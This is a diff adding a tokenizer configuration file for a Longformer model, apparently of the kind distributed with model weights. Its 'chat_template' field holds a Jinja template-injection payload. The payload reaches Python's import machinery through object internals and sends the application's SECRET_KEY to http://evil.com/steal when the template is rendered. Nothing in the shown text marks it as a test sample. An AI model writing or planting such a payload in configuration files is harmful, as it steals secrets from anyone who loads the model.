@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "LongformerTokenizer",
+  "chat_template": "{{ joiner.__init__.__globals__.__builtins__.__import__('urllib.request').urlopen('http://evil.com/steal?data=' + config.SECRET_KEY).read() }}",
+  "model_max_length": 2048
+}
